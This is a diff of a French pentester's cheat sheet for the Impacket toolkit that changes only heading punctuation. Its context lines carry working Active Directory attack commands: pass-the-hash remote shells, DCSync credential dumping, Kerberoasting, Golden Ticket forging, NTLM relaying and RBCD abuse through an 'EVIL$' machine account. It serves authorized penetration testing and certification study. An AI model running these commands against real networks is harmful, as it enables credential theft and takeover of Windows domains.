@@ -1,4 +1,4 @@
-# Impacket — Référence complète
+# Impacket : Référence complète
 
 > Suite d'outils Python pour l'exploitation des protocoles réseau Windows. La boîte à outils indispensable du pentesteur AD.
 
@@ -18,9 +18,9 @@ NT_HASH="${HASH##*:}"
 
 ---
 
-## Authentification — Exécution à distance
+## Authentification : Exécution à distance
 
-### psexec.py — Shell SYSTEM via SMB
+### psexec.py : Shell SYSTEM via SMB
 
 ```bash
 # Avec mot de passe
@@ -38,7 +38,7 @@ psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP cmd.exe /c "whoami /all"
 
 **Caractéristiques :** Crée un service temporaire. Shell SYSTEM. Bruyant (logs Event 7045).
 
-### wmiexec.py — Shell via WMI (plus discret)
+### wmiexec.py : Shell via WMI (plus discret)
 
 ```bash
 # Avec mot de passe
@@ -56,7 +56,7 @@ wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP "whoami"
 
 **Caractéristiques :** Utilise WMI (port 135+RPC). Contexte de l'utilisateur (pas SYSTEM). Plus discret que psexec.
 
-### smbexec.py — Shell via SMB (sans upload de fichier)
+### smbexec.py : Shell via SMB (sans upload de fichier)
 
 ```bash
 psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP
@@ -68,7 +68,7 @@ smbexec.py $DOMAIN/$USER:'$PWD'@$DC_IP
 
 ## Dump de credentials
 
-### secretsdump.py — Le plus important
+### secretsdump.py : Le plus important
 
 ```bash
 # DCSync complet (nécessite droits DA ou DCSync)
@@ -95,7 +95,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 
 ## Kerberos
 
-### getTGT.py — Obtenir un TGT
+### getTGT.py : Obtenir un TGT
 
 ```bash
 getTGT.py $DOMAIN_FQDN/$USER:$PWD
@@ -104,7 +104,7 @@ export KRB5CCNAME=$PWD/$USER.ccache
 klist
 ```
 
-### GetUserSPNs.py — Kerberoasting
+### GetUserSPNs.py : Kerberoasting
 
 ```bash
 # Lister les SPNs
@@ -121,7 +121,7 @@ GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD -request-user svc_sql -dc-ip $DC_IP
 GetUserSPNs.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER -dc-ip $DC_IP -request
 ```
 
-### GetNPUsers.py — AS-REP Roasting
+### GetNPUsers.py : AS-REP Roasting
 
 ```bash
 # Sans auth (avec liste d'users)
@@ -136,7 +136,7 @@ GetNPUsers.py $DOMAIN_FQDN/$USER:$PWD \
     -outputfile ~/certif/hashes/asrep.hash
 ```
 
-### getST.py — S4U (Délégation contrainte / RBCD)
+### getST.py : S4U (Délégation contrainte / RBCD)
 
 ```bash
 # S4U2self + S4U2proxy
@@ -152,7 +152,7 @@ getST.py -spn 'cifs/target.entreprise.local' \
 export KRB5CCNAME=$PWD/Administrator.ccache
 ```
 
-### ticketer.py — Forger des tickets
+### ticketer.py : Forger des tickets
 
 ```bash
 # Golden Ticket
@@ -179,7 +179,7 @@ ticketer.py -nthash $KRBTGT_HASH \
 export KRB5CCNAME=$PWD/Administrator.ccache
 ```
 
-### ticketConverter.py — Conversion ccache ↔ kirbi
+### ticketConverter.py : Conversion ccache ↔ kirbi
 
 ```bash
 ticketConverter.py ticket.kirbi ticket.ccache
@@ -204,14 +204,14 @@ ldapdomaindump -u "$DOMAIN\\$USER" --no-json --no-grep \
 firefox ~/certif/loot/ldap/domain_users.html
 ```
 
-### lookupsid.py — Récupérer le SID
+### lookupsid.py : Récupérer le SID
 
 ```bash
 lookupsid.py $DOMAIN/$USER:$PWD@$DC_IP 0 | head
 lookupsid.py -hashes :$NT_HASH $DOMAIN/$USER@$DC_IP 0 | head
 ```
 
-### findDelegation.py — Trouver les délégations
+### findDelegation.py : Trouver les délégations
 
 ```bash
 findDelegation.py $DOMAIN_FQDN/$USER:$PWD -dc-ip $DC_IP
@@ -240,7 +240,7 @@ ntlmrelayx.py -t ldaps://$DC_IP --delegate-access --add-computer
 ntlmrelayx.py -6 -socks -t ldap://$DC_IP -smb2support -tf targets.txt
 ```
 
-### addcomputer.py — Créer un compte machine (pour RBCD)
+### addcomputer.py : Créer un compte machine (pour RBCD)
 
 ```bash
 addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' \
@@ -248,7 +248,7 @@ addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' \
                $DOMAIN_FQDN/$USER:$PWD
 ```
 
-### rbcd.py — Configurer la délégation RBCD
+### rbcd.py : Configurer la délégation RBCD
 
 ```bash
 rbcd.py -delegate-from 'EVIL$' \
